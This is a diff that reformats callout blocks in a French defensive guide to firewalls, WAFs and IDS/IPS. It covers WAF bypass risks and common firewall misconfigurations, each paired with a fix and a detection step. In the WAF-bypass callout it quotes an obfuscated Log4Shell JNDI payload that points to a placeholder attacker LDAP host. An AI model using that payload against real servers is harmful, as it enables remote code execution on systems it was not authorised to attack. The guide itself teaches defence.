@@ -253,17 +253,14 @@ Include /etc/modsecurity/crs/rules/*.conf
 
 Les chemins et directives dépendent de la distribution et de la version du module.
 
-> 🔴 **Vecteurs d'attaque contre un WAF** :
->
-> - **Contournement par encodage** : les premières règles contre Log4Shell (CVE-2021-44228) bloquaient `${jndi:`, et les attaquants sont passés à `${${lower:j}ndi:ldap://<ATTACKER>/a}`. Un WAF à signatures court derrière les variantes.
-> - **Contournement par l'origine** : si l'IP du serveur d'origine est connue (historique DNS, certificats exposés, Shodan) et joignable, l'attaquant parle directement à l'application et le WAF ne voit rien.
-{: .callout .callout-danger}
+🔴 **Vecteurs d'attaque contre un WAF** :
 
-> 🔒 **Contrôle de sécurité** : le pare-feu de l'origine n'accepte le 443/8443 que depuis les IP du reverse proxy ou du WAF (ou exige une authentification mutuelle TLS). Cette règle est la plus oubliée des déploiements WAF.
-{: .callout .callout-securite}
+- **Contournement par encodage** : les premières règles contre Log4Shell (CVE-2021-44228) bloquaient `${jndi:`, et les attaquants sont passés à `${${lower:j}ndi:ldap://<ATTACKER>/a}`. Un WAF à signatures court derrière les variantes.
+- **Contournement par l'origine** : si l'IP du serveur d'origine est connue (historique DNS, certificats exposés, Shodan) et joignable, l'attaquant parle directement à l'application et le WAF ne voit rien.
 
-> ⚠️ **Coût réel** : un WAF en mode blocage sans phase d'observation bloque du trafic légitime (formulaires riches, API JSON avec balises). Commencez en `DetectionOnly`, analysez les logs d'audit, ajoutez des exclusions ciblées par URL, puis basculez. Monter le niveau de paranoïa du CRS augmente la détection et les faux positifs ensemble.
-{: .callout .callout-attention}
+🔒 **Contrôle de sécurité** : le pare-feu de l'origine n'accepte le 443/8443 que depuis les IP du reverse proxy ou du WAF (ou exige une authentification mutuelle TLS). Cette règle est la plus oubliée des déploiements WAF.
+
+⚠️ **Coût réel** : un WAF en mode blocage sans phase d'observation bloque du trafic légitime (formulaires riches, API JSON avec balises). Commencez en `DetectionOnly`, analysez les logs d'audit, ajoutez des exclusions ciblées par URL, puis basculez. Monter le niveau de paranoïa du CRS augmente la détection et les faux positifs ensemble.
 
 ---
 
@@ -411,47 +408,40 @@ Le compromis : le gain en sécurité est immédiat, le risque est de couper un f
 
 ## Erreurs fréquentes
 
-> ⚠️ **Politique par défaut `ACCEPT` avec quelques `DROP`**
->
-> - Conséquence : tout port nouvellement ouvert par un service est exposé sans que personne ne l'ait décidé.
-> - Correction : `policy drop` sur `input`, `forward` et `output`, puis n'ouvrir que le nécessaire. Détection : `nmap -p-` depuis l'extérieur et comparaison avec la liste des services attendus.
-{: .callout .callout-attention}
+⚠️ **Politique par défaut `ACCEPT` avec quelques `DROP`**
 
-> ⚠️ **Règles IPv4 strictes, IPv6 oublié**
->
-> - Conséquence : `iptables` est configuré mais `ip6tables` est vide. Le service reste joignable via l'IPv6 global de la machine.
-> - Correction : nftables en famille `inet`, ou politique `drop` aussi pour IPv6. Détection : `nmap -6 -p- <HOST6>`.
-{: .callout .callout-attention}
+- Conséquence : tout port nouvellement ouvert par un service est exposé sans que personne ne l'ait décidé.
+- Correction : `policy drop` sur `input`, `forward` et `output`, puis n'ouvrir que le nécessaire. Détection : `nmap -p-` depuis l'extérieur et comparaison avec la liste des services attendus.
 
-> ⚠️ **`permit tcp any any established` en ACL**
->
-> - Conséquence : un scan ACK passe, et un attaquant dans la zone peut forger des paquets ACK vers n'importe quel hôte.
-> - Correction : un pare-feu stateful entre les zones, ou des règles `established` limitées à des hôtes et ports sources précis.
-{: .callout .callout-attention}
+⚠️ **Règles IPv4 strictes, IPv6 oublié**
 
-> ⚠️ **Règle « temporaire » sans date d'expiration**
->
-> - Conséquence : l'ouverture devient permanente et personne ne s'en souvient.
-> - Correction : règle avec propriétaire, ticket et date de fin. Revue périodique des règles à zéro hit.
-{: .callout .callout-attention}
+- Conséquence : `iptables` est configuré mais `ip6tables` est vide. Le service reste joignable via l'IPv6 global de la machine.
+- Correction : nftables en famille `inet`, ou politique `drop` aussi pour IPv6. Détection : `nmap -6 -p- <HOST6>`.
 
-> ⚠️ **WAF devant un serveur d'origine joignable**
->
-> - Conséquence : l'attaquant contourne le WAF en visant l'IP d'origine.
-> - Correction : le pare-feu de l'origine n'accepte que les IP du WAF ou une authentification mutuelle TLS. Détection : le `curl --resolve` du tableau de tests.
-{: .callout .callout-attention}
+⚠️ **`permit tcp any any established` en ACL**
 
-> ⚠️ **IPS en blocage dès le premier jour**
->
-> - Conséquence : un faux positif sur une règle générique coupe un flux métier.
-> - Correction : IDS d'abord, `drop` seulement sur les `sid` à haute confiance, avec liste de contournement documentée.
-{: .callout .callout-attention}
+- Conséquence : un scan ACK passe, et un attaquant dans la zone peut forger des paquets ACK vers n'importe quel hôte.
+- Correction : un pare-feu stateful entre les zones, ou des règles `established` limitées à des hôtes et ports sources précis.
 
-> ⚠️ **Interface d'administration du pare-feu sur l'interface WAN**
->
-> - Conséquence : exposition aux CVE de l'équipement lui-même.
-> - Correction : écoute limitée à une interface de management dédiée, accès par bastion ou VPN avec MFA.
-{: .callout .callout-attention}
+⚠️ **Règle « temporaire » sans date d'expiration**
+
+- Conséquence : l'ouverture devient permanente et personne ne s'en souvient.
+- Correction : règle avec propriétaire, ticket et date de fin. Revue périodique des règles à zéro hit.
+
+⚠️ **WAF devant un serveur d'origine joignable**
+
+- Conséquence : l'attaquant contourne le WAF en visant l'IP d'origine.
+- Correction : le pare-feu de l'origine n'accepte que les IP du WAF ou une authentification mutuelle TLS. Détection : le `curl --resolve` du tableau de tests.
+
+⚠️ **IPS en blocage dès le premier jour**
+
+- Conséquence : un faux positif sur une règle générique coupe un flux métier.
+- Correction : IDS d'abord, `drop` seulement sur les `sid` à haute confiance, avec liste de contournement documentée.
+
+⚠️ **Interface d'administration du pare-feu sur l'interface WAN**
+
+- Conséquence : exposition aux CVE de l'équipement lui-même.
+- Correction : écoute limitée à une interface de management dédiée, accès par bastion ou VPN avec MFA.
 
 ---
 
